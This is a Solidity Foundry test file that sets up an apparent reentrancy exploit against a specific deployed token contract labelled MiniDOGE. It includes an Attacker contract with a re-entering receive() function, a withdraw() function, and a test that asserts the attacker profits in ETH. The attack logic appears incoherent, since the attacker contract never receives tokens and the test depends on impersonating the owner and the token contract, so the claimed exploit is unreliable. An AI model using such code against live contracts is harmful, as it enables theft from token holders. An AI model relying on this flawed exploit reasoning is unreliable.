pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMiniDOGE {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function uniswapV2Pair() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function swapAndLiquifyEnabled() external view returns (bool);
    function buyBackEnabled() external view returns (bool);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function setBuyBackEnabled(bool _enabled) external;
    function minimumTokensBeforeSwapAmount() external view returns (uint256);
    function decimals() external view returns (uint8);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function WETH() external pure returns (address);
}

address constant TARGET = 0xBa07EED3d09055d60CAEf2bDfCa1c05792f2dFad;

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address attacker = address(this);
    IMiniDOGE token;
    Attacker attackerContract;
    uint256 minSwap;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IMiniDOGE(TARGET);
        vm.label(TARGET, "MiniDOGE");

        // Get owner address from storage slot 0
        address owner = address(uint160(uint256(vm.load(TARGET, bytes32(uint256(0))))));
        vm.label(owner, "Owner");

        // Enable swap and buyback features
        vm.startPrank(owner);
        try IMiniDOGE(TARGET).setSwapAndLiquifyEnabled(true) {}
        catch {}
        try IMiniDOGE(TARGET).setBuyBackEnabled(true) {}
        catch {}
        vm.stopPrank();

        // Get minimum tokens threshold
        minSwap = token.minimumTokensBeforeSwapAmount();

        // Deploy attacker contract
        attackerContract = new Attacker(TARGET);
        vm.label(address(attackerContract), "AttackerContract");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get owner address from storage slot 0
        address owner = address(uint160(uint256(vm.load(TARGET, bytes32(uint256(0))))));
        console.log("Owner:", owner);

        // Enable swap and buyback features via owner
        vm.startPrank(owner);
        try token.setSwapAndLiquifyEnabled(true) {} catch {}
        try token.setBuyBackEnabled(true) {} catch {}
        vm.stopPrank();

        // Get minimum tokens threshold
        uint256 minSwap = token.minimumTokensBeforeSwapAmount();
        console.log("Min swap amount:", minSwap);

        // Get the Uniswap pair address
        address pair = token.uniswapV2Pair();
        console.log("Pair address:", pair);

        // Record initial ETH balance
        uint256 initialEth = address(attackerContract).balance;
        console.log("Initial attacker ETH:", initialEth);

        // Use owner to transfer tokens to the contract to accumulate above threshold
        // First, check owner's balance
        uint256 ownerBalance = token.balanceOf(owner);
        console.log("Owner balance:", ownerBalance);

        // Transfer from owner to contract to build up contract balance
        vm.startPrank(owner);
        token.transfer(TARGET, minSwap * 2);
        vm.stopPrank();

        console.log("Contract balance after owner transfer:", token.balanceOf(TARGET));

        // Now transfer from contract to pair - this should trigger swapTokens
        // We need to impersonate the contract to transfer
        vm.startPrank(TARGET);
        token.transfer(pair, minSwap);
        vm.stopPrank();

        // Check final ETH balance
        uint256 finalEth = address(attackerContract).balance;
        console.log("Final attacker ETH:", finalEth);

        // Assert profit was made
        assertGt(finalEth, initialEth, "Attacker should have gained ETH from reentrancy");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

contract Attacker {
    IMiniDOGE public token;
    address public owner;
    uint256 public reenterCount;

    constructor(address _token) {
        token = IMiniDOGE(_token);
        owner = msg.sender;
    }

    receive() external payable {
        // Reenter during swap by transferring tokens back
        // This triggers _transfer which may allow ETH extraction
        if (reenterCount < 2 && address(token).balance > 0) {
            reenterCount++;
            // Try to trigger another transfer during the swap
            uint256 balance = token.balanceOf(address(this));
            if (balance > 0) {
                token.transfer(token.uniswapV2Pair(), balance / 10);
            }
        }
    }

    function attack() external {
        uint256 balance = token.balanceOf(address(this));
        token.transfer(TARGET, balance);
    }

    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}

